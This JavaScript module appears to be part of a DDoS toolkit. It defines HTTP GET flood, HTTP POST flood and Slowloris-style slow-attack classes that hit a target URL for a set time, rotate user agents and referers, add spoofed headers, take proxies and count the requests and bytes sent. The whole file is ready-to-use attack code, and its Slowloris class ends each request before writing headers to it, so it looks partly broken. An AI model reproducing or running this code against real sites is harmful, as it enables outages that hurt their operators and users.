import http from 'http';
import https from 'https';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * HTTP/1.1 GET Flood Attack
 */
export class HTTPGetFlood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const headers = {
            'Host': this.url.host,
            'User-Agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Sec-Gpc': '1',
            'Pragma': 'no-cache',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['Referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'GET',
                headers: this.generateHeaders(),
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.end();
                BYTES_SENT.add(JSON.stringify(options.headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/1.1 POST Flood Attack
 */
export class HTTPPostFlood extends HTTPGetFlood {
    generatePayload() {
        return JSON.stringify({
            data: Tools.randomString(32)
        });
    }

    async attack() {
        return new Promise((resolve) => {
            const payload = this.generatePayload();
            const headers = this.generateHeaders();
            headers['Content-Type'] = 'application/json';
            headers['Content-Length'] = Buffer.byteLength(payload);
            headers['X-Requested-With'] = 'XMLHttpRequest';

            const options = {
                hostname: this.url.hostname,
                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                path: this.url.pathname + this.url.search,
                method: 'POST',
                headers: headers,
                timeout: 900
            };

            const protocol = this.url.protocol === 'https:' ? https : http;

            const makeRequest = () => {
                if (!this.active) {
                    resolve();
                    return;
                }

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.add(1);
                    res.on('data', () => {});
                    res.on('end', () => {});
                });

                req.on('error', () => {});
                req.on('timeout', () => req.destroy());

                req.write(payload);
                req.end();
                
                BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(options.headers).length);
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(resolve, 100);
        });
    }
}

/**
 * HTTP Slow Attack (Slowloris)
 */
export class HTTPSlowAttack {
    constructor(targetUrl, duration, userAgents = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.userAgents = userAgents;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const protocol = this.url.protocol === 'https:' ? https : http;
            const port = this.url.port || (this.url.protocol === 'https:' ? 443 : 80);

            const socket = protocol.request({
                hostname: this.url.hostname,
                port: port,
                method: 'GET',
                path: this.url.pathname + this.url.search,
                headers: {
                    'User-Agent': this.userAgents.length > 0 
                        ? Tools.randomChoice(this.userAgents)
                        : 'Mozilla/5.0',
                    'Accept': 'text/html'
                }
            });

            const keepAlive = setInterval(() => {
                if (!this.active) {
                    clearInterval(keepAlive);
                    socket.destroy();
                    resolve();
                    return;
                }

                try {
                    socket.write(`X-a: ${Tools.randomInt(1, 5000)}\r\n`);
                    BYTES_SENT.add(20);
                } catch (e) {
                    clearInterval(keepAlive);
                    socket.destroy();
                    resolve();
                }
            }, 1000);

            socket.on('error', () => {
                clearInterval(keepAlive);
                resolve();
            });

            socket.on('timeout', () => {
                clearInterval(keepAlive);
                socket.destroy();
                resolve();
            });

            socket.end();
        });
    }

    stop() {
        this.active = false;
    }
}
